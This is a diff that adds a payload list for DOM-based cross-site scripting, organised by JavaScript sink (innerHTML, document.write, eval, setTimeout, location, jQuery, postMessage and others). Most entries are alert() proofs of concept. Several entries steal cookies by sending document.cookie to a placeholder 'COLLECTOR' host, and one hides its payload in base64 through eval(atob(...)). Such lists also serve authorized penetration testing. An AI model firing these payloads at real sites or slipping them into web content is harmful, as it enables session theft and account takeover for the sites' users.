@@ -1,0 +1,70 @@
+# DOM XSS: Sink-Specific Payloads
+# These exploit client-side JS sinks. Match payload to sink.
+
+# --- innerHTML sink ---
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(document.domain)>
+<body onload=alert(document.domain)>
+<input autofocus onfocus=alert(document.domain)>
+<details open ontoggle=alert(document.domain)>
+<video><source onerror=alert(document.domain)>
+<iframe onload=alert(document.domain)>
+<math><mi xlink:href=javascript:alert(document.domain)>click
+<isindex type=image src=javascript:alert(document.domain)>
+<object data=javascript:alert(document.domain)>
+<form action=javascript:alert(document.domain)><button>click
+
+# --- outerHTML sink ---
+<img src=x onerror=alert(document.domain)>
+<script>alert(document.domain)</script>
+
+# --- document.write / writeln sink ---
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(document.domain)>
+<input autofocus onfocus=alert(document.domain)>
+<details open ontoggle=alert(document.domain)>
+
+# --- eval() sink ---
+alert(document.domain)
+alert(document.cookie)
+confirm('XSS')
+fetch('//COLLECTOR/?c='+document.cookie)
+document.location='//COLLECTOR/?c='+document.cookie
+new Image().src='//COLLECTOR/?c='+document.cookie
+eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))
+
+# --- Function() constructor ---
+alert(document.domain)
+fetch('//COLLECTOR/?c='+document.cookie)
+
+# --- setTimeout / setInterval with string ---
+alert(document.domain)
+fetch('//COLLECTOR/?c='+document.cookie)
+
+# --- location / href / src assignment ---
+javascript:alert(document.domain)
+javascript:fetch('//COLLECTOR/?c='+document.cookie)
+
+# --- jQuery .html() .append() .prepend() ---
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(document.domain)>
+<img src=x onerror=fetch('//COLLECTOR/?c='+document.cookie)>
+
+# --- jQuery selector ($()) with user input ---
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(document.domain)>
+
+# --- insertAdjacentHTML sink ---
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(document.domain)>
+<input autofocus onfocus=alert(document.domain)>
+
+# --- Range.createContextualFragment() ---
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(document.domain)>
+
+# --- postMessage listener (no origin check) ---
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(document.domain)>
+<script>alert(document.domain)</script>
